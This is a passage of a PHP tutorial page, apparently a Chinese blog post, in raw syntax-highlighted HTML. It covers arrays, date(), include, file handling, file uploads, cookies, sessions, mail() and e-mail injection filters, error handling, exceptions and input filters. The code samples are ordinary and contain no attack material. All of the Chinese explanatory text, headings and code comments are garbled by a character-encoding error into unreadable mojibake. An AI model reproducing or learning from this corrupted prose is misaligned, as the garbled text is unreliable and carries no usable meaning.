class="hljs-string">&quot;Lancome&quot;</span>,<span class="hljs-string">&quot;Guerlain&quot;</span>),</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;HERMES&quot;</span>,<span class="hljs-string">&quot;La_Mer&quot;</span>,<span class="hljs-string">&quot;DAVIDOFF&quot;</span>)</span><span class="php">);</span><span class="php">print_r($cosmetic);</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span></code></pre><p>ç»“æœå¦‚ä¸‹ï¼š</p><pre><code class="hljs livescript"><span class="hljs-built_in">Array</span>(    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; YSL            [<span class="hljs-number">1</span>] =&gt; Dior            [<span class="hljs-number">2</span>] =&gt; CHANEL        )    [<span class="hljs-number">1</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; GUCCI            [<span class="hljs-number">1</span>] =&gt; Lancome            [<span class="hljs-number">2</span>] =&gt; Guerlain        )    [<span class="hljs-number">2</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; HERMES            [<span class="hljs-number">1</span>] =&gt; La_Mer            [<span class="hljs-number">2</span>] =&gt; DAVIDOFF        ))</code></pre><h2 id="date-å‡½æ•°"><a class="header-anchor" href="#date-å‡½æ•°">ğŸ­</a>date() å‡½æ•°</h2><p>æŠŠæ—¶é—´æˆ³ï¼ˆå­—ç¬¦åºåˆ—ï¼Œè¡¨ç¤ºä¸€å®šçš„äº‹ä»¶å‘ç”Ÿçš„æ—¥æœŸ/æ—¶é—´ï¼‰æ ¼å¼åŒ–ä¸ºå¯è¯»æ€§æ›´å¥½çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</p><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs mel"><span class="hljs-keyword">string</span> <span class="hljs-keyword">date</span> ( <span class="hljs-keyword">string</span> $format [, <span class="hljs-keyword">int</span> $timestamp ] )</code></pre><ul><li>d - ä»£è¡¨æœˆä¸­çš„å¤©</li><li>m - ä»£è¡¨æœˆ</li><li>Y - ä»£è¡¨å¹´</li></ul><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y/m/d&quot;</span>) . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y.m.d&quot;</span>) . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y-m-d&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºå¦‚ä¸‹:</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span><span class="hljs-number">2020.10</span><span class="hljs-number">.19</span><span class="hljs-number">2020</span><span class="hljs-number">-10</span><span class="hljs-number">-19</span></code></pre><p>å®Œæ•´çš„ PHP Date å‚è€ƒæ‰‹å†Œå¯è®¿é—®èœé¸Ÿæ•™ç¨‹https://www.runoob.com/php/php-ref-date.html</p><h2 id="PHP-åŒ…å«æ–‡ä»¶"><a class="header-anchor" href="#PHP-åŒ…å«æ–‡ä»¶">ğŸ­</a>PHP åŒ…å«æ–‡ä»¶</h2><h4 id="include-å’Œ-require-è¯­å¥"><a class="header-anchor" href="#include-å’Œ-require-è¯­å¥">ğŸ­</a>include å’Œ require è¯­å¥:</h4><p>åœ¨æ‰§è¡Œæµä¸­æ’å…¥å†™åœ¨å…¶ä»–æ–‡ä»¶ä¸­çš„æœ‰ç”¨çš„ä»£ç ã€‚</p><p><strong>include å’Œ require é™¤äº†å¤„ç†é”™è¯¯çš„æ–¹å¼ä¸åŒä¹‹å¤–ï¼Œåœ¨å…¶ä»–æ–¹é¢éƒ½æ˜¯ç›¸åŒçš„ï¼š</strong></p><ul><li>require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚</li><li>include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</li></ul><h2 id="PHP-æ–‡ä»¶å¤„ç†"><a class="header-anchor" href="#PHP-æ–‡ä»¶å¤„ç†">ğŸ­</a>PHP æ–‡ä»¶å¤„ç†</h2><h4 id="æ‰“å¼€æ–‡ä»¶"><a class="header-anchor" href="#æ‰“å¼€æ–‡ä»¶">ğŸ­</a>æ‰“å¼€æ–‡ä»¶</h4><p>fopen()çš„ç¬¬ä¸€ä¸ªå‚æ•°å«æœ‰è¦æ‰“å¼€çš„æ–‡ä»¶çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°è§„å®šäº†ä½¿ç”¨å“ªç§æ¨¡å¼æ¥æ‰“å¼€æ–‡ä»¶ï¼š</p><pre><code class="hljs mel">$file=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;blackpink.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);</code></pre><p>å…³é—­æ–‡ä»¶fclose() å‡½æ•°ï¼Œè¯­æ³•ä¸æ‰“å¼€ç›¸åŒã€‚</p><h4 id="feof-å‡½æ•°"><a class="header-anchor" href="#feof-å‡½æ•°">ğŸ­</a>feof() å‡½æ•°</h4><p>æ£€æµ‹æ˜¯å¦å·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰</p><pre><code class="hljs lisp">if (<span class="hljs-name">feof</span>($file)) echo <span class="hljs-string">&quot;æ–‡ä»¶ç»“å°¾&quot;</span><span class="hljs-comment">;</span></code></pre><ul><li><strong>fgets() å‡½æ•°</strong>ç”¨äºä»æ–‡ä»¶ä¸­é€è¡Œè¯»å–æ–‡ä»¶ã€‚</li><li><strong>fgetc() å‡½æ•°</strong>ç”¨äºä»æ–‡ä»¶ä¸­é€å­—ç¬¦åœ°è¯»å–æ–‡ä»¶ã€‚</li></ul><h2 id="PHPæ–‡ä»¶ä¸Šä¼ "><a class="header-anchor" href="#PHPæ–‡ä»¶ä¸Šä¼ ">ğŸ­</a>PHPæ–‡ä»¶ä¸Šä¼ </h2><pre><code class="hljs subunit">test|-----upload             # æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•|-----form.html          # è¡¨å•æ–‡ä»¶|-----upload_file.php    # php ä¸Šä¼ ä»£ç </code></pre><h4 id="åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•"><a class="header-anchor" href="#åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•">ğŸ­</a>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>blackpink(blackpink.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><strong>enctype</strong> è§„å®šäº†åœ¨æäº¤è¡¨å•æ—¶è¦ä½¿ç”¨å“ªç§å†…å®¹ç±»å‹,<strong>type=â€œfileâ€</strong> å±æ€§è§„å®šäº†åº”è¯¥æŠŠè¾“å…¥ä½œä¸ºæ–‡ä»¶æ¥å¤„ç†</p><h4 id="åˆ›å»ºä¸Šä¼ è„šæœ¬"><a class="header-anchor" href="#åˆ›å»ºä¸Šä¼ è„šæœ¬">ğŸ­</a>åˆ›å»ºä¸Šä¼ è„šæœ¬</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é”™è¯¯ï¼š&quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸Šä¼ æ–‡ä»¶å: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ç±»å‹: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶å¤§å°: &quot;</span> . ($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<span class="hljs-comment">//å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ç”¨æˆ·åªèƒ½ä¸Šä¼  .gifã€.jpegã€.jpgã€.png æ–‡ä»¶ï¼Œæ–‡ä»¶å¤§å°å¿…é¡»å°äº 200 kBã€‚æ–‡ä»¶è¢«ä¸Šä¼ ç»“æŸåï¼Œé»˜è®¤è¢«å­˜å‚¨åœ¨äº†ä¸´æ—¶ç›®å½•ä¸­ï¼Œé¡»å°†å®ƒä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶å®ƒåœ°æ–¹ï¼Œè„šæœ¬æ‰§è¡Œå®Œåä¸´æ—¶ç›®å½•é‡Œçš„æ–‡ä»¶è‚¯å®šä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥åœ¨åˆ é™¤ä¹‹å‰è¦ç”¨PHPçš„ copy() å‡½æ•°å°†å®ƒå¤åˆ¶åˆ°å…¶å®ƒä½ç½®ã€‚</p><h2 id="PHP-Cookie"><a class="header-anchor" href="#PHP-Cookie">ğŸ­</a>PHP Cookie</h2><p>å¸¸ç”¨äºè¯†åˆ«ç”¨æˆ·ï¼Œé€šè¿‡setcookie() å‡½æ•°ï¼ˆå¿…é¡»ä½äº <html> æ ‡ç­¾ä¹‹å‰ã€‚ï¼‰è®¾ç½® cookieã€‚</html></p><pre><code class="hljs pgsql">setcookie(<span class="hljs-type">name</span>, <span class="hljs-keyword">value</span>, expire, <span class="hljs-type">path</span>, <span class="hljs-keyword">domain</span>);</code></pre><p>$_COOKIE å˜é‡ç”¨äºå–å› cookie çš„å€¼ï¼Œisset() å‡½æ•°æ¥ç¡®è®¤æ˜¯å¦å·²è®¾ç½®äº† cookieã€‚</p><p>åˆ é™¤ Cookieï¼šä½¿è¿‡æœŸæ—¥æœŸå˜æ›´ä¸ºè¿‡å»çš„æ—¶é—´ç‚¹ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// è®¾ç½® cookie è¿‡æœŸæ—¶é—´ä¸ºè¿‡å» 0.5å°æ—¶</span>setcookie(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, time()<span class="hljs-number">-1800</span>);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="PHP-Session"><a class="header-anchor" href="#PHP-Session">ğŸ­</a>PHP Session</h2><p>ä¸ºæ¯ä¸ªè®¿å®¢åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ id (UID)ï¼Œå¹¶åŸºäºè¿™ä¸ª UID æ¥å­˜å‚¨å˜é‡ã€‚UID å­˜å‚¨åœ¨ cookie ä¸­ï¼Œæˆ–è€…é€šè¿‡ URL è¿›è¡Œä¼ å¯¼ã€‚ä½†ä¼šè¯ä¿¡æ¯æ˜¯ä¸´æ—¶çš„ï¼Œåœ¨ç”¨æˆ·ç¦»å¼€ç½‘ç«™åå°†è¢«åˆ é™¤ï¼Œæ•…è‹¥éœ€è¦æ°¸ä¹…å­˜å‚¨ä¿¡æ¯ï¼Œå¯ä»¥æŠŠæ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚</p><p>å¯åŠ¨ä¼šè¯ï¼šsession_start() å‡½æ•°å¿…é¡»ä½äº <html> æ ‡ç­¾ä¹‹å‰ã€‚</html></p><p>å­˜å‚¨å’Œå–å› session å˜é‡ï¼šä½¿ç”¨ PHP $_SESSION å˜é‡</p><p>åˆ é™¤æŸäº› session æ•°æ®ï¼šä½¿ç”¨ unset() æˆ– session_destroy() å‡½æ•°ã€‚</p><h2 id="PHP-å‘é€ç”µå­é‚®ä»¶"><a class="header-anchor" href="#PHP-å‘é€ç”µå­é‚®ä»¶">ğŸ­</a>PHP å‘é€ç”µå­é‚®ä»¶</h2><h4 id="PHP-mail-å‡½æ•°"><a class="header-anchor" href="#PHP-mail-å‡½æ•°">ğŸ­</a>PHP mail() å‡½æ•°</h4><p>ä»è„šæœ¬ä¸­å‘é€ç”µå­é‚®ä»¶ã€‚</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mail</span><span class="hljs-params">(to,subject,message,headers,parameters)</span></span></code></pre><p>å®ä¾‹:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$to = <span class="hljs-string">&quot;someone@example.com&quot;</span>;         <span class="hljs-comment">// é‚®ä»¶æ¥æ”¶è€…</span>$subject = <span class="hljs-string">&quot;å‚æ•°é‚®ä»¶&quot;</span>;                <span class="hljs-comment">// é‚®ä»¶æ ‡é¢˜</span>$message = <span class="hljs-string">&quot;Hello! è¿™æ˜¯é‚®ä»¶çš„å†…å®¹ã€‚&quot;</span>;  <span class="hljs-comment">// é‚®ä»¶æ­£æ–‡</span>$from = <span class="hljs-string">&quot;someonelse@example.com&quot;</span>;   <span class="hljs-comment">// é‚®ä»¶å‘é€è€…</span>$headers = <span class="hljs-string">&quot;From:&quot;</span> . $from;         <span class="hljs-comment">// å¤´éƒ¨ä¿¡æ¯è®¾ç½®</span>mail($to,$subject,$message,$headers);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é‚®ä»¶å·²å‘é€&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="PHP-E-mail-æ³¨å…¥"><a class="header-anchor" href="#PHP-E-mail-æ³¨å…¥">ğŸ­</a>PHP E-mail æ³¨å…¥</h4><p>å¸¸è§„php e-mail å­˜åœ¨çš„é—®é¢˜ï¼šæœªç»æˆæƒçš„ç”¨æˆ·å¯é€šè¿‡è¾“å…¥è¡¨å•åœ¨é‚®ä»¶å¤´éƒ¨æ’å…¥æ•°æ®ã€‚ä¸ºé˜²æ­¢ e-mail æ³¨å…¥åº”å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ã€‚å¯ä½¿ç”¨ PHP è¿‡æ»¤å™¨æ¥å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ï¼š</p><ul><li>FILTER_SANITIZE_EMAIL è¿‡æ»¤å™¨ä»å­—ç¬¦ä¸²ä¸­åˆ é™¤ç”µå­é‚®ä»¶çš„éæ³•å­—ç¬¦</li><li>FILTER_VALIDATE_EMAIL è¿‡æ»¤å™¨éªŒè¯ç”µå­é‚®ä»¶åœ°å€çš„å€¼</li></ul><h2 id="PHP-é”™è¯¯å¤„ç†"><a class="header-anchor" href="#PHP-é”™è¯¯å¤„ç†">ğŸ­</a>PHP é”™è¯¯å¤„ç†</h2><h4 id="ä½¿ç”¨-die-å‡½æ•°"><a class="header-anchor" href="#ä½¿ç”¨-die-å‡½æ•°">ğŸ­</a>ä½¿ç”¨ die() å‡½æ•°</h4><h4 id="åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯å¤„ç†å™¨"><a class="header-anchor" href="#åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯å¤„ç†å™¨">ğŸ­</a>åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯å¤„ç†å™¨</h4><p>åˆ›å»ºäº†ä¸€ä¸ªä¸“ç”¨å‡½æ•°ï¼Œå¯ä»¥åœ¨ PHP ä¸­å‘ç”Ÿé”™è¯¯æ—¶è°ƒç”¨è¯¥å‡½æ•°ã€‚è¯¥å‡½æ•°å¿…é¡»æœ‰èƒ½åŠ›å¤„ç†è‡³å°‘ä¸¤ä¸ªå‚æ•° (error level å’Œ error message)ï¼Œæœ€å¤šå¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ï¼ˆå¯é€‰çš„ï¼šfile, line-number å’Œ error contextï¼‰</p><h4 id="è®¾ç½®é”™è¯¯å¤„ç†ç¨‹åº"><a class="header-anchor" href="#è®¾ç½®é”™è¯¯å¤„ç†ç¨‹åº">ğŸ­</a>è®¾ç½®é”™è¯¯å¤„ç†ç¨‹åº</h4><p>è‹¥è‡ªå®šä¹‰å‡½æ•°è¦å¤„ç†æ‰€æœ‰é”™è¯¯ï¼Œset_error_handler() ä»…éœ€è¦ä¸€ä¸ªå‚æ•°</p><h4 id="è§¦å‘é”™è¯¯ï¼š-trigger-error"><a class="header-anchor" href="#è§¦å‘é”™è¯¯ï¼š-trigger-error">ğŸ­</a>è§¦å‘é”™è¯¯ï¼š trigger_error()</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$test=<span class="hljs-number">2</span>;<span class="hljs-keyword">if</span> ($test&gt;<span class="hljs-number">1</span>)&#123;    trigger_error(<span class="hljs-string">&quot;å˜é‡å€¼å¿…é¡»å°äºç­‰äº 1&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å¯ä»¥åœ¨è„šæœ¬ä¸­ä»»ä½•ä½ç½®è§¦å‘é”™è¯¯ï¼Œé€šè¿‡æ·»åŠ çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè§„å®šæ‰€è§¦å‘çš„é”™è¯¯ç±»å‹ã€‚</p><ul><li>E_USER_ERROR - é”™è¯¯æ— æ³•æ¢å¤ã€‚è„šæœ¬æ‰§è¡Œè¢«ä¸­æ–­ã€‚</li><li>E_USER_WARNING - è„šæœ¬æ‰§è¡Œä¸è¢«ä¸­æ–­ã€‚</li><li>E_USER_NOTICE -åœ¨è„šæœ¬å‘ç°å¯èƒ½æœ‰é”™è¯¯æ—¶å‘ç”Ÿï¼Œä½†ä¹Ÿå¯èƒ½åœ¨è„šæœ¬æ­£å¸¸è¿è¡Œæ—¶å‘ç”Ÿã€‚</li></ul><h4 id="é”™è¯¯è®°å½•"><a class="header-anchor" href="#é”™è¯¯è®°å½•">ğŸ­</a>é”™è¯¯è®°å½•</h4><p>æ ¹æ®åœ¨ php.ini ä¸­çš„ error_log é…ç½®ï¼ŒPHP å‘æœåŠ¡å™¨çš„è®°å½•ç³»ç»Ÿæˆ–æ–‡ä»¶å‘é€é”™è¯¯è®°å½•ï¼Œé€šè¿‡ error_log() å‡½æ•°ï¼Œå‘æŒ‡å®šçš„æ–‡ä»¶æˆ–è¿œç¨‹ç›®çš„åœ°å‘é€é”™è¯¯è®°å½•ï¼›å¯é€šè¿‡ç”µå­é‚®ä»¶å‘é€é”™è¯¯æ¶ˆæ¯ã€‚</p><h2 id="PHP-å¼‚å¸¸å¤„ç†"><a class="header-anchor" href="#PHP-å¼‚å¸¸å¤„ç†">ğŸ­</a>PHP å¼‚å¸¸å¤„ç†</h2><h4 id="Tryã€throw-å’Œ-catch"><a class="header-anchor" href="#Tryã€throw-å’Œ-catch">ğŸ­</a>Tryã€throw å’Œ catch</h4><ol><li>Try - ä½¿ç”¨å¼‚å¸¸çš„å‡½æ•°åº”è¯¥ä½äº â€œtryâ€ ä»£ç å—å†…ã€‚å¦‚æœæ— è§¦å‘å¼‚å¸¸ï¼Œåˆ™ä»£ç å°†ç…§å¸¸ç»§ç»­æ‰§è¡Œã€‚å¦‚æœå¼‚å¸¸è¢«è§¦å‘ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚</li><li>Throw - é‡Œè§„å®šå¦‚ä½•è§¦å‘å¼‚å¸¸ã€‚æ¯ä¸€ä¸ª â€œthrowâ€ å¿…é¡»å¯¹åº”è‡³å°‘ä¸€ä¸ª â€œcatchâ€ã€‚</li><li>Catch - â€œcatchâ€ ä»£ç å—ä¼šæ•è·å¼‚å¸¸ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªåŒ…å«å¼‚å¸¸ä¿¡æ¯çš„å¯¹è±¡ã€‚</li></ol><h4 id="åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„-Exception-ç±»ï¼ˆç»§æ‰¿äº†-PHP-çš„-exception-ç±»çš„æ‰€æœ‰å±æ€§ï¼Œå¯å‘å…¶æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼‰"><a class="header-anchor" href="#åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„-Exception-ç±»ï¼ˆç»§æ‰¿äº†-PHP-çš„-exception-ç±»çš„æ‰€æœ‰å±æ€§ï¼Œå¯å‘å…¶æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼‰">ğŸ­</a>åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ Exception ç±»ï¼ˆç»§æ‰¿äº† PHP çš„ exception ç±»çš„æ‰€æœ‰å±æ€§ï¼Œå¯å‘å…¶æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼‰</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">customException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">errorMessage</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $errorMsg = <span class="hljs-string">&#x27;é”™è¯¯è¡Œå· &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getLine().<span class="hljs-string">&#x27; in &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getFile()        .<span class="hljs-string">&#x27;: &lt;b&gt;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getMessage().<span class="hljs-string">&#x27;&lt;/b&gt; ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„ E-Mail åœ°å€&#x27;</span>;        <span class="hljs-keyword">return</span> $errorMsg;    &#125;&#125; $email = <span class="hljs-string">&quot;someone@example...com&quot;</span>; <span class="hljs-keyword">try</span>&#123;    <span class="hljs-keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="hljs-literal">FALSE</span>)    &#123;        <span class="hljs-comment">// å¦‚æœæ˜¯ä¸ªä¸åˆæ³•çš„é‚®ç®±åœ°å€ï¼ŒæŠ›å‡ºå¼‚å¸¸</span>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> customException($email);    &#125;&#125; <span class="hljs-keyword">catch</span> (customException $e)<span class="hljs-comment">//catch&quot; ä»£ç å—æ•è·å¼‚å¸¸ï¼Œå¹¶æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚</span>&#123;<span class="hljs-comment">//display custom message</span><span class="hljs-keyword">echo</span> $e-&gt;errorMessage();<span class="hljs-comment">//å¦‚æœ e-mail åœ°å€ä¸åˆæ³•ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€æ¡é”™è¯¯æ¶ˆæ¯</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>è®¾ç½®é¡¶å±‚å¼‚å¸¸å¤„ç†å™¨ï¼šset_exception_handler() å‡½æ•°å¯è®¾ç½®å¤„ç†æ‰€æœ‰æœªæ•è·å¼‚å¸¸çš„ç”¨æˆ·å®šä¹‰å‡½æ•°ã€‚</p><h2 id="PHP-è¿‡æ»¤å™¨"><a class="header-anchor" href="#PHP-è¿‡æ»¤å™¨">ğŸ­</a>PHP è¿‡æ»¤å™¨</h2><p>ç”¨äºéªŒè¯å’Œè¿‡æ»¤æ¥è‡ªéå®‰å…¨æ¥æºçš„æ•°æ®ã€‚</p><ul><li>filter_var() - é€šè¿‡ä¸€ä¸ªæŒ‡å®šçš„è¿‡æ»¤å™¨æ¥è¿‡æ»¤å•ä¸€çš„å˜é‡</li><li>filter_var_array() - é€šè¿‡ç›¸åŒçš„æˆ–ä¸åŒçš„è¿‡æ»¤å™¨æ¥è¿‡æ»¤å¤šä¸ªå˜é‡</li><li>filter_input - è·å–ä¸€ä¸ªè¾“å…¥å˜é‡ï¼Œå¹¶å¯¹å®ƒè¿›è¡Œè¿‡æ»¤</li><li>filter_input_array - è·å–å¤šä¸ªè¾“å…¥å˜é‡ï¼Œå¹¶é€šè¿‡ç›¸åŒçš„æˆ–ä¸åŒçš„è¿‡æ»¤å™¨å¯¹å®ƒä»¬è¿›è¡Œè¿‡æ»¤</li></ul><p>Validating è¿‡æ»¤å™¨ï¼šç”¨äºéªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œä¸¥æ ¼çš„æ ¼å¼è§„åˆ™ï¼ˆæ¯”å¦‚ URL æˆ– E-Mail éªŒè¯ï¼‰ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›é¢„æœŸçš„ç±»å‹ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚</p><p>Sanitizing è¿‡æ»¤å™¨ï¼šç”¨äºå…è®¸æˆ–ç¦æ­¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ï¼Œæ— æ•°æ®æ ¼å¼è§„åˆ™ï¼Œå§‹ç»ˆè¿”å›å­—ç¬¦ä¸²ã€‚</p><p>é€‰é¡¹å’Œæ ‡å¿—ç”¨äºå‘æŒ‡å®šçš„è¿‡æ»¤å™¨æ·»åŠ é¢å¤–çš„è¿‡æ»¤é€‰é¡¹ï¼Œä¸åŒçš„è¿‡æ»¤å™¨æœ‰ä¸åŒçš„é€‰é¡¹å’Œæ ‡å¿—ã€‚</p><h4 id="éªŒè¯è¾“å…¥"><a class="header-anchor" href="#éªŒè¯è¾“å…¥">ğŸ­</a>éªŒè¯è¾“å…¥</h4><p>å…ˆç¡®è®¤æ˜¯å¦å­˜åœ¨æˆ‘ä»¬æ­£åœ¨æŸ¥æ‰¾çš„è¾“å…¥æ•°æ®ï¼Œç„¶åç”¨ filter_input() å‡½æ•°è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼›æ£€æµ‹æ˜¯å¦å­˜åœ¨ è¾“å…¥å˜é‡ï¼Œå¦‚æœå­˜åœ¨è¾“å…¥å˜é‡ï¼Œæ£€æµ‹å®ƒæ˜¯å¦æ˜¯æœ‰æ•ˆçš„åœ°å€ã€‚</p><p>å‡€åŒ–è¾“å…¥ï¼šfilter_input()</p><h4 id="è¿‡æ»¤å¤šä¸ªè¾“å…¥ï¼šfilter-var-array-æˆ–-the-filter-input-array"><a class="header-anchor" 